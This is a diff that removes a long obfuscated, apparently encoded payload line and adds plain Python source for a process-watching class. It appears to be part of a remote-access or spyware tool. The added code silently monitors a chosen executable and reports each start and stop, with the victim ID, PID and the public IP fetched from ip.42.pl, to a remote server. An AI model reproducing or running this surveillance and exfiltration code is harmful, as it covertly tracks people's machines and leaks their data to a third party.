@@ -1,1 +1,52 @@
-=AAAAAwcAAAAB4TZsVHZv1GPIoNAAAAKyBAAAcicAAAAnIHAAAwJyBAAAEgcBkiTAAAABIXACEABBgAAAAgBzBAAAEAAAAQAyBAAAgicAAAAnIHAAAwJyBAAAcicAAAApIHZvhGdl12czFGbjtg2AAAALI3XfVWbh5GbhVXcf9FDa/1XlxWdk9Wbf9lCa/1Xl1WYu91XIotBpAAAAIgcBkiTf9Fdp5Waf9lLu9Wa0B3bwBXYSoXAOEANAgQAKAgCBoQAWEgCAYQAIAgEBgAASEACAARAMAgAB4QAKAgBBIDAIEgCBoRACEgDBQQASEABBoQAEAgCAogAAAAAAQ0cAAAAD81X0lmbp91XIodLtIg+AAAAnIHApCAAAwhcl1mAaTXazlGBad3buNg239GaDoNAAAAEyJXZ2JXZzZg2mxWZzRg2IkCclVGbzVg2l1Wa0Rg2lZ3btVmcGoNAAAgByN3clN2byBFajV3Uv5UDaP3clN2byBVZpJWbvpVDaPXd0FGdzZg20NXasRg20hXZ0Rg2zR3clVXclJHCaTWawNg2yR3cDoNZplXTEoNdh1mcvZmBaTmblN3XFoNZuVGcwFmBaXGelNg2lxWamVWbhNHCajGdhBHBaP3bCotclRXafN3clN2byBHDazWa0V3cwZg20V2ZDo9c0NXasVg2YkCAAAQCyBAAAIgcCkCAAAwAyBAAAIgcCkCAAAgApnCMsISN5ICL9JXI7tiI6MWasJWdQ1CUp5GXisSfyFyerISPElEUg4Sf7BiIr0nchsHK1BnbpZjew9GdzRg2n5Wau5Wdydg2l52bORg2kVWauVGRzNXZjNWQMoNZlRXYulWbyVGdKodZpJWbvpnBafXYy9Cbw5iM04Ccp9yL6AHd0h2E6BiOgMgepADLnUTOnwSfyFyerIiOjlGbiVHUtAVauxlIr0nchs3Ki0DRJBFIucmbp5mb1JHIisSfyFyeoUHcul2O6RnchR3cFoNAAAgAyRlROJRKAMFAkBQPCwHAqBAfAclKxBQABM4DkdhaWQHAXRccAEgADSwgPoWADeAZBomD0FwgNomB8xAdHwHAXAwgHomB8BwFGQ2C0pgaOQWA8lAdELnBrFBZDwHABEwgGwXFqRAfmJXAQKwaJQ2B8BAPCwHAqBAfHwHxyNwaAkhA8BgaAw3B8RscDsGDkdAfAglAuBQWH03CkBQAAEAABAhbAk1B9pAZAEAABAQAiIXAQqwaUomA0BABq4GAZdQfJQGABAQAAEACyFAkKs2EqJAdAQARuBQWH0HCkBQAAEAAB4ucKsmEqJAdAQAXuBwVH0HADGhaGwHD5ZQfa3FAEFwgEwHE0ZOeAclRxBAWGFHAZBQAAEAABYUcAcFABIwgDM4DqFwgHQWAq5AdBMYDqZAfMQHAXAwgHomB8BwFGQ2C0pgaFQWA8lAdmKnBrBBZDwHABEwgGwHCqRAfmK3BrRAfGwnpyJwgCwHADegaGwnBqVgaEQnX5ZQfw1FAEBwgDomA0xHeF0XAk5qcBAZADKAfBoGAqBAfGiXAQSQfAcGA8IAfAoGA8JAZAMFAkBAPCwHAqBAfBQGGyZwaAoGA8JAfAAQA8OHAAAwQAAAAPAAAAgAAAAAAAAAAEMGa09mYEotbvlGdw9GcwFWCabQKAMFBkVgWBMYAEOAZCQWBkRQZDoFApJgWAQWAaBQZAAAAeMHAAAAQAAAAEAAAAAAAAAAAAAAAAM2ApAwUCQGAaJwgBQGAEGAZAQGAHBAAAIxcAAAAABAAAMAAAAAAAAAAAAAAAAw4
+class appoption:
+    lists = {}
+
+    @classmethod
+    def __init__(self, server, path, how='both'):
+        if path in self.lists:
+            self.lists[path] = False
+            return
+        self.lists[path] = True
+        now = []
+        while self.lists.get(path):
+            for me in psutil.process_iter():
+                try:
+                    if os.path.samefile(me.exe(), path) and me not in now:
+                        now.append(me)
+                        if how in ['both', 'start']:
+                            _send(
+                                server,
+                                '''inpu({!r}+" running. PID="+{!r}+"\\\\n'''
+                                '''iP-Public:"+{!r},'95',0)'''.format(
+                                    Myid + ' : ' + me.exe(), str(me.pid),
+                                    requests.get('http://ip.42.pl/raw').text
+                                )
+                            )
+                except:
+                    pass
+            for me in list(now):
+                try:
+                    status = me.status()
+                except psutil.ZombieProcess:
+                    status = "zombie"
+                except psutil.NoSuchProcess:
+                    status = "terminated"
+                except psutil.AccessDenied:
+                    status = "AccessDenied"
+                except:
+                    status = "None"
+                if status != 'running' and status != self.lists[path]:
+                    self.lists[path] = status
+                    if status == 'terminated':
+                        now.remove(me)
+                    if how in ['both', 'stop']:
+                        _send(
+                            server,
+                            '''inpu({!r}+" {}. PID="+{!r}+"\\\\n'''
+                            '''iP-Public:"+{!r},"95",0)'''.format(
+                                Myid + ' : ' + me.exe(), status, str(me.pid),
+                                requests.get('http://ip.42.pl/raw').text
+                            )
+                        )
+            time.sleep(2)
+        del self.lists[path]
